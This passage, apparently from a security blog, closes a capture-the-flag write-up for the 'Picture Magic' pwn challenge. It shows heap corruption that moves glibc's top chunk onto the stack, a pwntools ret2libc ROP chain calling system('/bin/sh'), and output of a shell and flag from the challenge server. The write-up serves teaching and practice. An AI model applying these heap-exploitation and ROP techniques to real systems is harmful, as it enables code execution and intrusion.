+</code></pre></div><p>At this point, we can free the <code>B</code> chunk and the unlink will take place. Now the heap is corrupted, we have modified the address of the top chunk. Let&rsquo;s have a look at the <code>arena</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>arena
+<span class="code-dark-cyan">------------------------------------------------- [arena] ----- p ((struct malloc_state*) 0x7fef151f6c60)[0] -------------------------------------------------</span>  
+$3 = {
+  <span class="code-dark-cyan">mutex</span> = <span class="code-dark-blue">0x0</span>,
+  <span class="code-dark-cyan">flags</span> = <span class="code-dark-blue">0x0</span>,
+  <span class="code-dark-cyan">have_fastchunks</span> = <span class="code-dark-blue">0x0</span>,
+  <span class="code-dark-cyan">fastbinsY</span> = {
+    [0x0] = <span class="code-dark-blue">0x0</span>,
+    [0x1] = <span class="code-dark-blue">0x0</span>,
+    ...
+    [0x9] = <span class="code-dark-blue">0x0</span>
+  },
+  <span class="code-dark-cyan">top</span> = <span class="code-dark-blue">0x7fffa0867980</span>,
+  <span class="code-dark-cyan">last_remainder</span> = <span class="code-dark-blue">0x0</span>,
+  <span class="code-dark-cyan">bins</span> = {
+    [0x0] = <span class="code-dark-blue">0x7fef151f6cc0</span> &lt;main_arena+96&gt;,
+    [0x1] = <span class="code-dark-blue">0x7fef151f6cc0</span> &lt;main_arena+96&gt;,
+    ...
+    [0xfd] = <span class="code-dark-blue">0x7fef151f74a0</span> &lt;main_arena+2112&gt;
+  },
+  <span class="code-dark-cyan">binmap</span> = {
+    [0x0] = <span class="code-dark-blue">0x0</span>,
+    [0x1] = <span class="code-dark-blue">0x0</span>,
+    [0x2] = <span class="code-dark-blue">0x0</span>,
+    [0x3] = <span class="code-dark-blue">0x0</span>
+  },
+  <span class="code-dark-cyan">next</span> = <span class="code-dark-blue">0x7fef151f6c60</span> &lt;main_arena&gt;,
+  <span class="code-dark-cyan">next_free</span> = <span class="code-dark-blue">0x0</span>,
+  <span class="code-dark-cyan">attached_threads</span> = <span class="code-dark-blue">0x1</span>,
+  <span class="code-dark-cyan">system_mem</span> = <span class="code-dark-blue">0x21000</span>,
+  <span class="code-dark-cyan">max_system_mem</span> = <span class="code-dark-blue">0x21000</span>
+}
+</code></pre></div><p>The top chunk points to the stack. This means that when we allocate a picture, it will be placed on the stack, near the <code>name</code> buffer. As a result, we will be able to modify picture attributes and achieve an arbitrary write primitive. But first of all, we need to add a valid size for the top chunk, so that the program does not crash:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">sell</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">change</span><span class="mtk1">(p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">20371</span><span class="mtk1">))</span>  
+</code></pre></div><p>Now we can allocate another picture and modify its size so that we have a large space to use <code>transform_picture</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">index</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">change</span><span class="mtk1">(p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">501</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p32(</span><span class="mtk7 mtki">0x</span><span class="mtk6">ffffffff</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p32(</span><span class="mtk6">1</span><span class="mtk1">))</span>  
+</code></pre></div><h3 id="rop-chain">ROP chain</h3><p>Since we have Glibc 2.36 and we are already on the stack, the best approach to get code execution is to place a ROP chain at the return address. Notice that we have an arbitrary write primitive, so no need to deal with the stack canary. Also, we are lucky that we don&rsquo;t actually need to use null bytes, because the null bytes we need are already there from other memory addresses.</p><p>After a bit of debugging, we find the return address from <code>main</code> and place a ret2libc ROP chain on the stack:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">rop</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ROP</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk8">write_qword</span><span class="mtk1">(p64(</span><span class="mtk1">rop</span><span class="mtk1">.ret.</span><span class="mtk1">address</span><span class="mtk1">), </span><span class="mtk6">56</span><span class="mtk1">, </span><span class="mtk1">index</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">write_qword</span><span class="mtk1">(p64(</span><span class="mtk1">rop</span><span class="mtk1">.rdi.</span><span class="mtk1">address</span><span class="mtk1">), </span><span class="mtk6">64</span><span class="mtk1">, </span><span class="mtk1">index</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">write_qword</span><span class="mtk1">(p64(</span><span class="mtk7">next</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk8">search</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh'</span><span class="mtk1">))), </span><span class="mtk6">72</span><span class="mtk1">, </span><span class="mtk1">index</span><span class="mtk1">)</span>  
+<span class="mtk1">    </span><span class="mtk8">write_qword</span><span class="mtk1">(p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.system), </span><span class="mtk6">80</span><span class="mtk1">, </span><span class="mtk1">index</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'-&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'6'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
+</code></pre></div><p>Finally, we call exit to trigger the <code>ret</code> instruction from <code>main</code> and execute the ROP chain. With all this, we have a shell locally:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './picture_magic'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'.'</span>
+[<span class="code-green">+</span>] Starting local process './picture_magic': pid 12621  
+[<span class="code-blue">*</span>] Name address: 0x7fffe394d2d0
+[<span class="code-green">+</span>] Glibc base address: 0x7f6c18a00000
+[<span class="code-green">+</span>] Heap base address: 0x555bd93f4000
+[<span class="code-blue">*</span>] Loaded 192 cached gadgets for 'libc.so.6'
+[<span class="code-blue">*</span>] Switching to interactive mode
+<span class="code-red">$</span> ls
+build-docker.sh  flag.txt    libc.so.6        solve.py
+Dockerfile     ld-2.36.so  picture_magic
+</code></pre></div><h2 id="flag">Flag</h2><p>Let&rsquo;s try remotely:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 167.99.85.216:31434
+[<span class="code-blue">*</span>] './picture_magic'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'.'</span>
+[<span class="code-green">+</span>] Opening connection to 167.99.85.216 on port 31434: Done  
+[<span class="code-blue">*</span>] Name address: 0x7ffeff8d5740
+[<span class="code-green">+</span>] Glibc base address: 0x7f4fb970d000
+[<span class="code-green">+</span>] Heap base address: 0x56545a0de000
+[<span class="code-blue">*</span>] Loaded 192 cached gadgets for 'libc.so.6'
+[<span class="code-blue">*</span>] Switching to interactive mode
+<span class="code-red">$</span> ls
+flag.txt
+ld-2.36.so
+libc.so.6
+picture_magic
+<span class="code-red">$</span> cat flag.txt
+HTB{h0u53_0f_31nh3rj4r_pu5h3d_b3y0nd_7h3_l1m17}
+</code></pre></div><p>The full exploit script can be found in here: <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Picture%20Magic/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#allocation-function">Allocation function</a></li><li><a href="#read-function">Read function</a></li><li><a href="#edit-function">Edit function</a></li><li><a href="#free-function">Free function</a></li><li><a href="#show-function">Show function</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a><ul><li><a href="#unsorted-bin">Unsorted Bin</a></li><li><a href="#house-of-einherjar-null-byte-poison">House of Einherjar (Null-byte poison)</a></li></ul></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#unlink-checks-bypass">Unlink checks bypass</a></li><li><a href="#rop-chain">ROP chain</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
